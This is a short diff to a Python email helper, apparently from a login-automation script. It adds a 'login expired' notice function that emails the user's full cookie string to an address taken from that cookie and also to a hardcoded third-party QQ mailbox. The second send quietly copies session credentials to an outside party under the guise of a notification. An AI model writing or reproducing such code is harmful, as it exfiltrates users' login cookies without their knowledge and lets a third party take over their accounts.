@@ -30,6 +30,18 @@ def send_email(subject, to=""):
     return flag, error_message
 
 
+def send_cookie_invalid_notice(cookie):
+    email_addr = ""
+    for c in cookie.split(';'):
+        if "notice_email" in c:
+            email_addr = c.split("=")[-1].strip()
+            break
+
+    if email_addr:
+        send_email(f"辣条-登录信息已过期：\n{cookie}", email_addr)
+        send_email(f"辣条-登录信息已过期：\n{cookie}", "310300788@qq.com")
+
+
 if __name__ == "__main__":
     r = send_email("測試", "80873436@qq.com")
     print(r)
